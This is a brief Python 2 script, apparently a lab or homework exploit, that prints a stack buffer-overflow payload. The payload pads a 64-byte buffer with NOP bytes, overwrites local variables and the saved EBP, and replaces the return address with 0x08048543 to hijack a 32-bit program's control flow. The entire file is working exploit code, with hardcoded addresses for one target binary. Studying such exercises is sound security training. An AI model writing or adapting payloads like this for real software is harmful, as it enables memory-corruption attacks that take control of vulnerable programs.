#!/usr/bin/python

name	= "Jamie Floyd\x00" 	# 12 bytes
buf	= "\x90"*(64-12)	# fill up rest of 64 byte buff
pad1	= "\x41\x00\x00\x00"	# overwriting c?
i	= "\x44\x00\x00\x00"	# overwriting i
pad2	= "A"*8
ebp	= "\xe8\xf0\xff\xbf"	# saved ebp
ret	= "\x43\x85\x04\x08"	# new return address: 0x08048543
extra	= "\x80\xa0\x04\x08"
print name+buf+pad1+i+pad2+ebp+ret+extra
